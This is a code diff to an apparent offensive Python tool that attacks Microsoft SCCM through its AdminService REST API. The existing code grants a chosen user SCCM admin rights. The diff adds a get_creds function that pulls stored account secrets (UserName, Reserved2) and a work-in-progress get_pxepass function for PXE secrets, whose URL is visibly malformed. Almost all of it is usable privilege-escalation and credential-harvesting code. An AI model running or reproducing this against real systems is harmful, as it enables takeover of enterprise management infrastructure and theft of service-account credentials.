@@ -19,7 +19,8 @@ class ADD_ADMIN:
 
     def jprint(self, obj):
         text = json.dumps(obj, sort_keys=True, indent=4)
-        logger.debug(text)
+        return (text)
+        #logger.debug(text)
 
 
     def add(self, targetuser, targetsid):
@@ -51,8 +52,8 @@ class ADD_ADMIN:
                                 verify=False,headers=self.headers, json=body)
             if r.status_code == 201:
                 logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
-                results = r.json()
-                self.jprint(results)
+                results = self.jprint(r.json())
+                logger.debug(results)
             else:
                 logger.info("[*] Something went wrong")
                 logger.info(r.text)
@@ -179,7 +180,38 @@ class ADD_ADMIN:
                 logger.info(r.status_code)
         except Exception as e:
                 print(e)  
-         # adminid = value[adminid]
-         #lookup sccm admin with provided args
 
-         #second request to delete the record
+    def get_creds(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_Reserved?$select=UserName,Reserved2,AccountUsage"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                data = r.json()
+                print(self.jprint(data))
+                return
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e) 
+    
+    #wip
+    def get_pxepass(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SysResUse$select=UserName,Reserved2"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                data = r.json()
+                logger.info(self.jprint(data))
+                return
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e) 
